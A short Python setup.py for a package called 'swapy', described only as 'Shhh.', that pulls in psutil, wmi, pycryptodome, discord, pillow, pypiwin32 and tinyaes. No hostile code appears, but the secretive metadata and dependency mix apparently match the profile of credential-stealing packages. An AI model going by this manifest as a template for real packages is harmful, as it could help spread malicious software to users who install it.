from setuptools import setup, find_packages
import codecs
import os,sys

VERSION = '1.165'
DESCRIPTION = 'Shhh.'

# Setting up
setup(
    name = "swapy",
    version = VERSION,
    author = "me",
    author_email = "spaceydot@proton.me",
    description = DESCRIPTION,
    packages = find_packages(),
    install_requires=['psutil', 'requests', 'wmi', 'pycryptodome', 'discord', 'discord.py', 'pillow', 'pypiwin32', 'alive-progress', 'tinyaes']
)